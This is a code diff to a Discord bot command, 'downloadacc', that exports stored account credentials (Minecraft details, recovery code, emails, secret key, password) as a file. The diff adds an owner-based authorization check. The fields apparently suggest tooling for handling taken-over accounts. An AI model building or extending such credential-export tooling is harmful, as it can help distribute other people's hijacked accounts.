@@ -1,6 +1,8 @@
 const { AttachmentBuilder } = require("discord.js");
 const { queryParams } = require("../../../db/database");
 
+const isOwner = require("../../../db/isOwner");
+
 module.exports = {
     name: "downloadacc",
     userOnly: true,
@@ -16,7 +18,28 @@ module.exports = {
                 });
             }
 
-            let [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = results[0].action.split("|");
+            const parts = results[0].action.split("|");
+            let ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password;
+
+            if (parts.length >= 10) {
+                [, ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
+                const isUserOwner = await isOwner(interaction.user.id);
+                if (ownerId && interaction.user.id !== ownerId && !isUserOwner) {
+                    return interaction.reply({
+                        content: "You are not authorized to download these credentials.",
+                        ephemeral: true,
+                    });
+                }
+            } else {
+                [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
+                const isUserOwner = await isOwner(interaction.user.id);
+                if (!isUserOwner) {
+                    return interaction.reply({
+                        content: "You are not authorized to download these credentials.",
+                        ephemeral: true,
+                    });
+                }
+            }
 
             const fileContent =
 `Username: ${newName}
